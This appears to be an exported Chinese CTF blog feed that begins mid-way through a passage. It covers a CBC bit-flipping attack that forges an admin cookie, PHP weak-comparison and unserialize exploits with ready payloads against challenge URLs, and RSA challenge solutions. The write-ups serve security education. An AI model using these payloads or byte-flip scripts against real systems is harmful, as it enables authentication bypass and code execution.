openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123; $info = unserialize($plain) or die("&lt;p&gt;base64_decode('".base64_encode($plain)."') can't unserialize&lt;/p&gt;"); $_SESSION['username'] = $info['username']; &#125;else&#123; die("ERROR!"); &#125; &#125;&#125;function show_homepage()&#123; if ($_SESSION["username"]==='admin')&#123; echo '&lt;p&gt;Hello admin&lt;/p&gt;'; echo '&lt;p&gt;Flag is $flag&lt;/p&gt;'; &#125;else&#123; echo '&lt;p&gt;hello '.$_SESSION['username'].'&lt;/p&gt;'; echo '&lt;p&gt;Only admin can see flag&lt;/p&gt;'; &#125; echo '&lt;p&gt;&lt;a href="loginout.php"&gt;Log out&lt;/a&gt;&lt;/p&gt;';&#125; 我们登录名 admiz 密码 bb 的 COOKIE 信息123456789101112GET /index.php HTTP/1.1Host: 47.93.190.246:49168User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 40Referer: http://47.93.190.246:49168/index.phpCookie: PHPSESSID=7nld2kvg1t560mtvuniqo63u02; iv=KYVIlJkfaja2cM8pENnLDg%3D%3D; cipher=3TFLhFRlhpfCeag8v7t% 2BtsVZnK%2Bl5YbtAHidL7blfvJMKe11Mwc% 2FBcFvys1PUmX51WYas4LuK62qXaSWihjHwQ%3D%3D Connection: close Upgrade-Insecure-Requests: 1 尝试更改 iv 或 cipher 的单个字节1YToyOntzOjg6InVzZXJuYYLHOrSKF5f/2bmVuBfm/45zOjg6InBhc3EXb3JkIjtzOjI6 ImJiIjt9 BASE64 解码看一下信息，发现序列完全被破坏：1a:2:&#123;s:8:"usernaÇ:´ÿÙ¹¸æÿs:8:"pasqord";s:2:"bb";&#125; 再换个字节：a:2:{s:8:”username”;s:5:”admiz”;ÚJW¹¼=;o·$YL::”bb”;} 反序列化失败。 我们要修改 admiz 为 admin 先分组，我们只关心前两组12第一组： a:2:&#123;s:8:"userna 第二组： me";s:5:"admiz"; z 位于第二组第 14 个字节，为改变 z 我们要改变第一组第 14 个字节我们将其异或掉 z,再异或以 n。代码如下： python版本：123import base64,urllib2cipher=base64.b64decode(urllib2.unquote("3TFLhFRlhpfCe ag8v7t%2BtsVZnK%2Bl5YbtAHidL7blfvJMKe11Mwc% 2FBcFvys1PUmX51WYas4LuK62qXaSWihjHwQ%3D%3D")) newcipher=cipher[0:13]+chr(ord(cipher[13])^ord('z')^or d('n'))+cipher[14:] newcipher=urllib2.quote(base64.b64encode(newcipher)) print newcipher php版本：12345678910&lt;?php$cipher = "3TFLhFRlhpfCeag8v69+tsVZnK+l5YbtAHidL7blfvJMKe11Mwc/BcFvys1PUmX51WYas4LuK62qXaSWihjHwQ==";$cipher = base64_decode($cipher);$cipher[9] = chr(ord($cipher[9]) ^ ord("q") ^ ord ("a"));$newcipher = base64_encode($cipher);$newcipher1 = urlencode($newcipher);echo $newcipher;echo "&lt;br&gt;";echo $newcipher1;?&gt; 得到13TFLhFRlhpfCeag8v69%2BtsVZnK% 2Bl5YbtAHidL7blfvJMKe11Mwc/BcFvys1PUmX51WYas4LuK62qXaS WihjHwQ%3D%3D 将此字符串作新的 cipher 值与原 iv 值一起提交返回如下：1&lt;p&gt;base64 _decode('GM6nRG1acpWMpWWr1Wz8Cm1lIjtzOjU6ImFkbWluIjtzO jg6InBhc3N3b3JkIjtzOjI6ImJiIjt9') can't unserialize&lt;/p&gt; Base64解码得到1Î§DmZr¥e«Õlü me";s:5:"admin";s:8:"password";s:2:"bb";&#125; 发现序列完全被破坏, 反序列化失败。 原因是第一个块数据（16字节）被破坏了。因为要 username 要等于 admin 所以不能利用文章（0x03一个练习中）里的说的填充字符。又因为是第一个块数据被破坏，第一个块数据是和 IV 有关，所以只要将在 CBC 字符翻转攻击，得到新的 IV 就可以修复第一块数据, 我们将 IV 值异或掉 data 的前16字节（用返回的 Base64 解码的明文信息 data），再异或我们要明文代码如下： python版本：12345678import base64,urllib2first_16Bytes='a:2:&#123;s:8:"userna'data=base64.b64decode(urllib2.unquote("GM6nRG1acpWMpWWr1Wz8Cm1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjI6ImJiIjt9"))iv=base64.b64decode(urllib2.unquote("KYVIlJkfaja2cM8pENnLDg%3D%3D"))newiv=''for i in range(16): newiv+=chr(ord(first_16Bytes[i])^ord(iv[i])^ord(data[i])) print urllib2.quote(base64.b64encode(newiv)) php版本：1234567891011121314&lt;?php$first_16Bytes='a:2:&#123;s:8:"userna';$cipher = base64_decode('GM6nRG1acpWMpWWr1Wz8Cm1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjI6ImJiIjt9');$iv=base64_decode('KYVIlJkfaja2cM8pENnLDg==');$newiv='';for ($i=0;$i&lt;16;$i++)&#123; $newiv.=chr(ord($first_16Bytes[$i])^ord($iv[$i])^ord($cipher[$i]));&#125;$newiv = base64_encode($newiv);echo $newiv;$newiv = urlencode($newiv);echo "&lt;br&gt;"echo $newiv;?&gt;]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>cbc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php弱类型漏洞]]></title>
    <url>%2F2017%2F12%2F21%2Fphp%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[常见的 php 弱类型归纳 介绍php中有两种比较的符号 == 与 ===$a = $b ;$a===$b ;=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较。== 在进行比较的时候，会先将字符串类型转化成相同，再比较。类型转换是无法避免的问题。例如需要将 GET 或者是 POST 的参数转换为 int 类型，或者是两个变量不匹配的时候，PHP 会自动地进行变量转换。但是 PHP 是一个弱类型的语言，导致在进行类型转换的时候会存在很多意想不到的问题。 常见的漏洞比较操作符在 $a==$b 的比较中12$a=null;$b=flase ; //true$a='';$b=null; //true 这样的例子还有很多，这种比较都是相等。使用比较操作符的时候也存在类型转换的问题，如下：12340=='0' //true0 == 'abcdefg' //true0 === 'abcdefg' //false1 == '1abcdef' //true 当一个字符串欸当作一个数值来取值，其结果和类型如下:如果该字符串没有包含 ‘.’,’e’,’E’ 并且其数值值在整形的范围之内，该字符串被当作 int 来取值，其他所有情况下都被作为 float 来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为 0。Example1：12345$test=1 + "10.5"; // $test=11.5(float)$test=1+"-1.3e3"; //$test=-1299(float)$test=1+"bob-1.3e3";//$test=1(int)$test=1+"2admin";//$test=3(int)$test=1+"admin2";//$test=1(int) Example2:1234567891011121314151617181920212223242526272829$flag = "THIS IS FLAG"; if ("POST" == $_SERVER['REQUEST_METHOD']) &#123; $password = $_POST['password']; if (0 &gt;= preg_match('/^[[:graph:]]&#123;12,&#125;$/', $password)) &#123; echo 'Wrong Format'; exit; &#125; while (TRUE) &#123; $reg = '/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'; if (6 &gt; preg_match_all($reg, $password, $arr)) break; $c = 0; $ps = array('punct', 'digit', 'upper', 'lower'); foreach ($ps as $pt) &#123; if (preg_match("/[[:$pt:]]+/", $password)) $c += 1; &#125; if ($c &lt; 3) break; if ("42" == $password) echo $flag; else echo 'Wrong password'; exit; &#125; &#125;payload: password=42.00e+0000000000 Hash比较在进行 hash 比较的时候也会存在问题。如下：1234567"0e132456789"=="0e7124511451155" //true"0e123456abc"=="0e1dddada" //false"0e1abc"=="0" //trueQNKCDZO==0e830400451993494058024219903391s878926199a==0e545993274517709034328855841020s155964671a==0e342768416822451524974117254469s214587387a==0e848240448830537924465865611904 在进行比较运算时，如果遇到了 0e\d+ 这种字符串，就会将这种字符串解析为科学计数法。所以上面例子中 2 个数的值都是 0 因而就相等了。如果不满足 0e\d+ 这种模式就不会相等。 Example:1234567891011121314&lt;?php$md51 = md5('QNKCDZO');$a = @$_GET['a'];$md52 = @md5($a);if(isset($a))&#123;if ($a != 'QNKCDZO' &amp;&amp; $md51 == $md52) &#123; echo "nctf&#123;*****************&#125;";&#125; else &#123; echo "false!!!";&#125;&#125;else&#123;echo "please input a";&#125;?&gt;payload: http://chinalover.sinaapp.com/web19/?a=s878926199a 十六进制转换还存在一种十六进制余字符串进行比较运算时的问题。例子如下：123"0x1e240"=="123456" //true"0x1e240"==123456 //true"0x1e240"=="1e240" //false 当其中的一个字符串是 0x 开头的时候，PHP 会将此字符串解析成为十进制然后再进行比较，0x1240解析成为十进制就是123456，所以与 int 类型和 string 类型的 123456 比较都是相等。Example：1234567891011121314151617181920212223&lt;?php function noother_says_correct($number)&#123; $one = ord('1'); $nine = ord('9'); for ($i = 0; $i &lt; strlen($number); $i++) &#123; $digit = ord($number&#123;$i&#125;); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123; return false; &#125; &#125; return $number == '54975581388';&#125;$flag='*******';if(noother_says_correct($_GET['key'])) echo $flag;else echo 'access denied';?&gt;payload: http://chinalover.sinaapp.com/web12/index.php?key=0xccccccccc 类型转换常见的转换主要就是 int 转换为 string，string 转换为 int。int 转 string：123$var = 5;方式1：$item = (string)$var;方式2：$item = strval($var); string 转 int：intval() 函数。(取整函数)对于这个函数，可以先看2个例子。123var_dump(intval('2')) //2var_dump(intval('3abcd')) //3var_dump(intval('abcd')) //0 说明 intval() 转换的时候，会将从字符串的开始进行转换知道遇到一个非数字的字符。即使出现无法转换的字符串，intval() 不会报错而是返回 0。Example：12345678910111213141516&lt;?phpif($_GET[id]) &#123; mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $id = intval($_GET[id]); $query = @mysql_fetch_array(mysql_query("select content from ctf2 where id='$id'")); if ($_GET[id]==1024) &#123; echo "&lt;p&gt;no! try again&lt;/p&gt;"; &#125; else&#123; echo($query[content]); &#125;&#125;?&gt;Payload: http://chinalover.sinaapp.com/web11/sql.php?id=1024.1 内置函数的参数的松散性内置函数的松散性说的是，调用函数时给函数传递函数无法接受的参数类型。 md5、sha1 绕过md5、sha1 函数无法处理数组，处理结果都是 nullExample1:123456789if (isset($_GET['a']) and isset($_GET['b'])) &#123;if ($_GET['a'] != $_GET['b'])if (md5($_GET['a']) === md5($_GET['b']))die('Flag: '.$flag);elseprint 'Wrong.';&#125;payload: a[]=1&amp;b[]=2 Example2：1234567891011121314&lt;?phpif(isset($_GET['v1']) &amp;&amp; isset($_GET['v2']) &amp;&amp; isset($_GET['v3']))&#123; $v1 = $_GET['v1']; $v2 = $_GET['v2']; $v3 = $_GET['v3']; if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123; if(!strcmp($v3, $flag))&#123; echo $flag; &#125; &#125;&#125;?&gt;payload: v1[]=1&amp;v2[]=2&amp;v3[]=3 ereg 函数漏洞：00 截断 %001ereg(string pattern, string string, array [regs]); 本函数以 pattern 的规则来解析比对字符串 string。比对结果返回的值放在数组参数 regs 之中，regs[0] 内容就是原字符串 string、regs[1] 为第一个合乎规则的字符串、regs[2] 就是第二个合乎规则的字符串，余类推。若省略参数 regs，则只是单纯地比对，找到则返回值为 true。 Example1：12345678910111213141516171819202122232425&lt;?phpif (isset ($_GET['password'])) &#123; if (ereg ("^[a-zA-Z0-9]+$",$_GET['password']) === FALSE) &#123; echo '&lt;p&gt;You password must be alphanumeric&lt;/p&gt;'; &#125; else if (strlen($_GET['password']) &lt; 8 &amp;&amp; $_GET['password'] &gt; 9999999) &#123; if (strpos ($_GET['password'], '*-*') !== FALSE) &#123; die('Flag: ' . $flag); &#125; else &#123; echo('&lt;p&gt;*-* have not been found&lt;/p&gt;'); &#125; &#125; else &#123; echo '&lt;p&gt;Invalid password&lt;/p&gt;'; &#125;&#125;?&gt; Payload: password=1e8%00*-* Example2：1234567891011view-source: if (isset ($_GET['nctf'])) &#123; if (@ereg ("^[1-9]+$", $_GET['nctf']) === FALSE) echo '必须输入数字才行'; else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE) die('Flag: '.$flag); else echo '骚年，继续努力吧啊~'; &#125;Payload1: nctf=1%00%23biubiubiu #要改成 %23 不然不行Payload2: nctf[]=1 因为ereg strpos 处理数组返回都是 null strcmp() 绕过如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。5.2 中是将两个参数先转换成 string 类型。5.3.3 以后，当比较数组和字符串的时候，返回是 null。5.5 中如果参数不是 string 类型，直接 return 了Example：12345678if (isset($_GET['password'])) &#123; if (strcmp($_GET['password'], $flag) == 0) die('Flag: '.$flag); else print 'Invalid password'; &#125;Payload: password[]=1 strcmp 处理数组直接返回 null switch() 绕过如果 switch 是数字类型的 case 的判断时，switch 会将其中的参数转换为 int 类型。如下：123456789$i ="2abc";switch ($i) &#123;case 0:case 1:case 2: echo "i is less than 3 but not negative"; break;case 3: echo "i is 3"; 这个时候程序输出的是 i is less than 3 but not negative，是由于 switch() 函数将 $i 进行了类型转换，转换结果为 2。 json() 绕过1234567891011121314151617&lt;?phpif (isset($_POST['message'])) &#123; $message = json_decode($_POST['message']); $key ="*********"; if ($message-&gt;key == $key) &#123; echo "flag"; &#125; else &#123; echo "fail"; &#125; &#125; else&#123; echo "~~~~"; &#125;?&gt;payload: message=&#123;"key":0&#125; 利用 0=="admin" in_array() array_search 函数搜索数组中是否存在指定的值。in_array array_search 介绍：(bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) ,如果 strict 参数没有提供，那么 in_array 就会使用松散比较来判断 $needle 是否在 $haystack 中。当 strince 的值为 true 时，in_array() 会比较 needls 的类型和 haystack 中的类型是否相同。123$array=[0,1,2,'3'];var_dump(in_array('abc', $array)); //truevar_dump(in_array('1bc', $array)); //true 可以看到上面的情况返回的都是 true,因为 ‘abc’ 会转换为 0，’1bc’ 转换为 1。Example:12345678910111213141516171819 &lt;?phpif(!is_array($_GET['test']))&#123;exit();&#125;$test=$_GET['test'];for($i=0;$i&lt;count($test);$i++)&#123; if($test[$i]==="admin")&#123; echo "error"; exit(); &#125; $test[$i]=intval($test[$i]);&#125;if(array_search("admin",$test)===0)&#123; echo "flag";&#125;else&#123; echo "false";&#125;?&gt;payload: test[]=0 extract 变量覆盖 — 从数组中将变量导入到当前的符号表12345678910extract(array,extract_rules,prefix) EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。EXTR_SKIP - 如果有冲突，不覆盖已有的变量。（忽略数组中同名的元素）EXTR_PREFIX_SAME - 如果有冲突，在变量名前加上前缀 prefix。EXTR_PREFIX_ALL - 给所有变量名加上前缀 prefix（第三个参数）。EXTR_PREFIX_INVALID - 仅在非法或数字变量名前加上前缀 prefix。EXTR_IF_EXISTS - 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。可以用在已经定义了一组合法的变量，然后要从一个数组例如 $_REQUEST 中提取值覆盖这些变量的场合。EXTR_PREFIX_IF_EXISTS - 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。EXTR_REFS - 将变量作为引用提取。这有力地表明了导入的变量仍然引用了 var_array 参数的值。可以单独使用这个标志或者在 extract_type 中用 OR 与其它任何标志结合使用。 extract 有三种形式可能导致变量覆盖! 第一种: EXTR_PREFIX_SAME Example：123456789&lt;?php$size="large";$var_array=array( "color"=&gt;"blue", "size"=&gt;"medium", "shape"=&gt;"round" );extract($var_array,EXTR_PREFIX_SAME,"test");echo "$color,$size,$shape,$test_size"; 输出为：bule large round medium 最后一个 size 变量被覆盖 第二种: EXTR_OVERWRITE 或者省略 EXTR_OVERWRITE Example：123456789&lt;?php$size="large";$var_array=array( "color"=&gt;"blue", "size"=&gt;"medium", "shape"=&gt;"round" );extract($var_array,EXTR_OVERWRITE); 或者 extract($var_array)echo "$color,$size,$shape"; 输出为：bule medium round size 变量被覆盖 第三种: EXTR_IF_EXISTS Example：123456789&lt;?php$size="large";$var_array=array( "color"=&gt;"blue", "size"=&gt;"medium", "shape"=&gt;"round" );extract($var_array,EXTR_IF_EXISTS);echo "$size"; 输出为：medium size 变量被覆盖 Example:123456789&lt;?php if ($_SERVER["REQUEST_METHOD"] == "POST") &#123; extract($_POST); if ($pass == $thepassword_123) &#123; &lt;?php echo $theflag; ?&gt; &#125; &#125;payload:pass=a&amp;thepassword_123=a serialize 和 unserialize 漏洞序列化与反序列化简单介绍序列化:把复杂的数据类型压缩到一个字符串中 数据类型可以是数组，字符串，对象等函数 : serialize()反序列化:恢复原先被序列化的变量 函数: unserialize() Example1:12345678&lt;?php$test1 = "hello world";$test2 = array("hello","world");$test3 = 123456;echo serialize($test1); // s:11:"hello world"; 序列化字符串echo serialize($test2); // a:2:&#123;i:0;s:5:"hello";i:1;s:5:"world";&#125; 序列化数组echo serialize($test3); // i:123456; ?&gt; Example2:12345678&lt;?phpclass hello&#123; public $test4 = "hello,world";&#125;$test = new hello();echo serialize($test);?&gt; // O:5:"hello":1:&#123;s:5:"test4";s:11:"hello,world";&#125; 序列化对象 首字母代表参数类型 O-&gt;Objext S-&gt;String... 序列化 public private protect 参数产生不同结果 Example:12345678910&lt;?phpclass test&#123; private $test1="hello"; public $test2="hello"; protected $test3="hello";&#125;$test = new test();echo serialize($test); ?&gt;// O:4:"test":3:&#123;s:11:" test test1";s:5:"hello";s:5:"test2";s:5:"hello";s:8:" * test3";s:5:"hello";&#125; test 类定义了三个不同类型(私有，公有，保护)但是值相同的字符串，序列化输出的值不相同通过对网页抓取输出是这样的1O:4:"test":3:&#123;s:11:"\00test\00test1";s:5:"hello";s:5:"test2";s:5:"hello";s:8:"\00*\00test3";s:5:"hello";&#125; Example:1234567891011121314151617181920212223242526272829&lt;?php error_reporting(0); class sercet&#123; private $file='index.php'; public function __construct($file)&#123; $this-&gt;file=$file; &#125; function __destruct()&#123; echo show_source($this-&gt;file,true); &#125; function __wakeup()&#123; $this-&gt;file='index.php'; &#125; &#125; $cmd=cmd00; if (!isset($_GET[$cmd]))&#123; echo show_source('index.php',true); &#125; else&#123; $cmd=base64_decode($_GET[$cmd]); if ((preg_match('/[oc]:\d+:/i',$cmd))||(preg_match('/flag/i',$cmd)))&#123; echo "Are u gaoshing?"; &#125; else&#123; unserialize($cmd); &#125; &#125;?&gt; //sercet in the_next.php 绕过正则可以用+号 绕过 __weakup 当成员属性数目大于实际数目时可绕过 wakeup1payload:O:+6:"sercet":2:&#123;S:12:"\00sercet\00file";s:12:"the_next.php";&#125; TzorNjoic2VyY2V0IjoyOntTOjEyOiJcMDBzZXJjZXRcMDBmaWxlIjtzOjEyOiJ0aGVfbmV4dC5waHAiO30KCgo= Example2:1234567891011121314151617&lt;?phpclass test&#123; public $username = ''; public $password = ''; public $file = ''; public function out()&#123; echo "username: ".$this-&gt;username."&lt;br&gt;"."password: ".$this-&gt;password ; &#125; public function __toString() &#123; return file_get_contents($this-&gt;file); &#125;&#125;$a = new test();$a-&gt;file = 'C:\Users\YZ\Desktop\plan.txt';echo serialize($a);?&gt; // _tostring 方法会在输出实例的时候执行，如果实例路径是隐秘文件就可以读取了 poc:12345678910111213141516&lt;?phpclass test&#123; public $username = ''; public $password = ''; public $file = ''; public function out()&#123; echo "username: ".$this-&gt;username."&lt;br&gt;"."password: ".$this-&gt;password ; &#125; public function __toString() &#123; return file_get_contents($this-&gt;file); &#125;&#125;$a = 'O:4:"test":3:&#123;s:8:"username";s:0:"";s:8:"password";s:0:"";s:4:"file";s:28:"C:\Users\YZ\Desktop\plan.txt";&#125;';echo unserialize($a);?&gt; session 反序列化漏洞主要原因是12ini_set(‘session.serialize_handler’, ‘php_serialize’);ini_set(‘session.serialize_handler’, ‘php’); 两者处理 session 的方式不同 利用下面代码可以生成 session 值123456&lt;?phpini_set('session.serialize_handler', 'php_serialize');//a:1:&#123;s:6:"spoock";s:3:"111";&#125;//ini_set('session.serialize_handler', 'php');//spoock|s:3:"111"session_start();$_SESSION["spoock"]=$_GET["a"];?&gt; 我们来看看生成的 session 值123spoock|s:3:"111"; // session 键值|内容序列化a:1:&#123;s:6:"spoock";s:3:"111";&#125;a:1:&#123;s:N:session 键值;内容序列化&#125;在ini_set('session.serialize_handler', 'php');中把 | 之前认为是键值后面的视为序列化 那么就可以利用这一漏洞执行一些恶意代码 看下面的例子1.php12345&lt;?phpini_set('session.serialize_handler', 'php_serialize');session_start();$_SESSION["spoock"]=$_GET["a"];?&gt; 2.php1234567891011121314&lt;?php ini_set('session.serialize_handler', 'php');session_start();class lemon &#123; var $hi; function __construct()&#123; $this-&gt;hi = 'phpinfo();'; &#125; function __destruct() &#123; eval($this-&gt;hi);//这里很危险，可以执行用户输入的参数 &#125;&#125;?&gt; 在 1.PHP 里面输入 a 参数序列化的值1|O:5:”lemon”:1:&#123;s:2:”hi”;s:10:”phpinfo();”;&#125; 则被序列化为1a:1:&#123;s:6:”spoock”;s:44:”|O:5:”lemon”:1:&#123;s:2:”hi”;s:10:”phpinfo();”;&#125; 在 2.PHP 里面打开就可以执行 phpinfo()了]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RSA归纳]]></title>
    <url>%2F2017%2F12%2F20%2FRSA%E5%BD%92%E7%BA%B3%2F</url>
    <content type="text"><![CDATA[分享一些RSA题目 RSA 原理RSA 大概原理，可百度大数 N 是由两个大的素数相乘而得，如果 N 唯一，p，q 唯一12N = p*qfn = (p-1)*(q-1) 找到一对 e,d 使得 e*d mod fn = 1，如果 e 是公钥，d 就是私钥明文 c，密文 m 的关系，^ 为幂运算符12c = m^e mod Nm = c^d mod N ps:如果 e=1,则 c=m 第一题已知 PUBLIC KEY 和 flag.enc 公钥算出 N e123456from Crypto.PublicKey import RSA pub = RSA.importKey(open('public.pem').read())n = long(pub.n)e = long(pub.e)print nprint e 分解 N 得出 p q利用工具：yafu下载 使用方法： 1234yafu-x64.exe factor(109966163992...) q=286924040788547268861394901519826758027p=258631601377848992211685134376492365269 N 如果太大可能无法分解 利用 p q e 算 d方法一：12345678import gmpy2p=286924040788547268861394901519826758027 q=258631601377848992211685134376492365269e=65537d=gmpy2.invert(e, (p-1)*(q-1))print dd=23071769375111040425287244625328797615295772814180109366784249976498215494337 方法二： 利用 rsatool.py rsatool.py下载1python rsatool.py -p 286924040788547268861394901519826758027 -q 258631601377848992211685134376492365269 -e 65537 ps: 得出的 d 是16进制 利用 e N d 算 private_key.pem利用 rsatool.py1python rsatool.py -e 65537 -n 74207624142945242263057035287110983967646020057307828709587969646701361764263 -d 23071769375111040425287244625328797615295772814180109366784249976498215494337 -o private_key.pem -f PEM 得到私钥 private_key.pem 利用私钥解密把 flag.enc 和 private_key.pem 放在同一个目录下 1openssl rsautl -decrypt -in flag.enc -inkey private_key.pem -out flag.dec 得到明文 第二题已知 p q 和密文 c ，算出明文 m 1234p = 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483q = 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407e = 65537c = 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034 python 代码如下： 123456p = 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483q = 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407n = p*qd = 56632047571190660567520341028861194862411428416862507034762587229995138605649836960220619903456392752115943299335385163216233744624623848874235303309636393446736347238627793022725260986466957974753004129210680401432377444984195145009801967391196615524488853620232925992387563270746297909112117451398527453977c = 0x767e17d22b50bcca982d1b09432365d6db9e417a03eef72899e6a05cb7a8bb4cc0b158fbdc463adba96d9b4acfd43cd75c80da6e87749a8482a65b5dffcec573c63924c62903ad802fe6e60905ae3c02cb9e916c01e651de914663f76267ed23895add9915ec171966841ad7b6d9d943a2bd023c3af9f96893705e98613f739aprint int(('%x' % pow(c,d,n)),16) 求出m的十进制 第三题已知 N e 和数组 c 12345678910111213141516171819202122232425262728293031323334353637383940&#123;920139713,19&#125; 70479679275221115227470416418414022368270835483295235263072905459788476483295235459788476663551792475206804459788476428313374475206804459788476425392137704796792458265677341524652483295235534149509425392137428313374425392137341524652458265677263072905483295235828509797341524652425392137475206804428313374483295235475206804459788476306220148 利用 yafu 求出 p q 再利用 p q e 算 d 123456import gmpy2p=18443 q=49891e=19d=gmpy2.invert(e, (p-1)*(q-1))print d python 代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172# -*- coding:utf8 -*-#快速幂取模def expMod2 (x, y, k ): MASK = 0xffffffff tx = x modRes = 1 tx %= k while (y&amp;MASK): if (y&amp;1): modRes = modRes * tx % k; y = (y&gt;&gt;1); tx = tx * tx % k; return modRes def toStr(i): result = "" while i!=0: result = chr(i % 256) + result i = i/256 return resultB = [704796792,752211152,274704164,18414022,368270835,483295235,263072905,459788476,483295235,459788476,663551792,475206804,459788476,428313374,475206804,459788476,425392137,704796792,458265677,341524652,483295235,534149509,425392137,428313374,425392137,341524652,458265677,263072905,483295235,828509797,341524652,425392137,475206804,428313374,483295235,475206804,459788476,306220148, ]n = 920139713d = 96849619result = ""for b in B: a = expMod2(b, d, n) result += toStr(a) print result 第四题N 很大的无法分解的情况 已知 PUBLIC KEY 和 c 求出 n e123456789from Crypto.PublicKey import RSA pub = RSA.importKey(open('warmup.pub').read())n = long(pub.n)e = long(pub.e)print 'n:%d'%nprint 'e:%d'%en:109966163992903243770643456296093759130737510333736483352345488643432614201030629970207047930115652268531222079508230987041869779760776072105738457123387124961036111210544028669181361694095594938869077306417325203381820822917059651429857093388618818437282624857927551285811542685269229705594166370426152128895901914709902037365652575730201897361139518816164746228733410283595236405985958414491372301878718635708605256444921222945267625853091126691358833453283744166617463257821375566155675868452032401961727814314481343467702299949407935602389342183536222842556906657001984320973035314726867840698884052182976760066141e:30749686305802061816334591167284030734478031427751495527922388099381921172620569310945418007467306454160014597828390709770861577479329793948103408489494025272834473555854835044153374978554414416305012267643957838998648651100705446875979573675767605387333733876537528353237076626094553367977134079292593746416875606876735717905892280664538346000950343671655257046364067221469807138232820446015769882472160551840052921930357988334306659120253114790638496480092361951536576427295789429197483597859657977832368912534761100269065509351345050758943674651053419982561094432258103614830448382949765459939698951824447818497599 尝试用 n 算出 p q factor(十进制..)yafu-x64.exe factor(109966163992…) N太大算不出来。。 使用RSAwienerHacker.py 直接算出 dRSAwienerHacker.py下载 利用 c d n 求 m方法一：1234c=0x1e04304936215de8e21965cfca9c245b1a8f38339875d36779c0f123c475bc24d5eef50e7d9ff5830e80c62e8083ec55f27456c80b0ab26546b9aeb8af30e82b650690a2ed7ea407dcd094ab9c9d3d25a93b2140dcebae1814610302896e67f3ae37d108cd029fae6362ea7ac1168974c1a747ec9173799e1107e7a56d783660418ebdf6898d7037cea25867093216c2c702ef3eef71f694a6063f5f0f1179c8a2afe9898ae8dec5bb393cdffa3a52a297cd96d1ea602309ecf47cd009829b44ed3100cf6194510c53c25ca7435f60ce5f4f614cdd2c63756093b848a70aade002d6bc8f316c9e5503f32d39a56193d1d92b697b48f5aa43417631846824b5e86d=4221909016509078129201801236879446760697885220928506696150646938237440992746683409881141451831939190609743447676525325543963362353923989076199470515758399Ln=109966163992903243770643456296093759130737510333736483352345488643432614201030629970207047930115652268531222079508230987041869779760776072105738457123387124961036111210544028669181361694095594938869077306417325203381820822917059651429857093388618818437282624857927551285811542685269229705594166370426152128895901914709902037365652575730201897361139518816164746228733410283595236405985958414491372301878718635708605256444921222945267625853091126691358833453283744166617463257821375566155675868452032401961727814314481343467702299949407935602389342183536222842556906657001984320973035314726867840698884052182976760066141print ('%x' % pow(c,d,n)).decode('hex') 方法二： 12345from libnum import n2sn=0x1564aade6f1b9f169dcc94c9787411984cd3878bcd6236c5ce00b4aad6ca7cb0ca8a0334d9fe0726f8b057c4412cfbff75967a91a370a1c1bd185212d46b581676cf750c05bbd349d3586e78b33477a9254f6155576573911d2356931b98fe4fec387da3e9680053e95a4709934289dc0bc5cdc2aa97ce62a6ca6ba25fca6ae38c0b9b55c16be0982b596ef929b7c71da3783c1f20557e4803de7d2a91b5a6e85df64249f48b4cf32aec01c12d3e88e014579982ecd046042af370045f09678c9029f8fc38ebaea564c29115e19c7030f245ebb2130cbf9dc1c340e2cf17a625376ca52ad8163cfb2e33b6ecaf55353bc1ff19f8f4dc7551dc5ba36235af9758bd=0x12314d6d6327261ee18a7c6ce8562c304c05069bc8c8e0b34e0023a3b48cf5849278d3493aa86004b02fa6336b098a3330180b9b9655cdf927896b22402a18fae186828efac14368e0a5af2c4d992cb956d52e7c9899d9b16a0a07318aa28c8202ebf74c50ccf49a6733327dde111393611f915f1e1b82933a2ba164aff93ef4ab2ab64aacc2b0447d437032858f089bcc0ddeebc45c45f8dc357209a423cd49055752bfae278c93134777d6e181be22d4619ef226abb6bfcc4adec696cac131f5bd10c574fa3f543dd7f78aee1d0665992f28cdbcf55a48b32beb7a1c0fa8a9fc38f0c5c271e21b83031653d96d25348f8237b28642ceb69f0b0374413308481c=0x126c24e146ae36d203bef21fcd88fdeefff50375434f64052c5473ed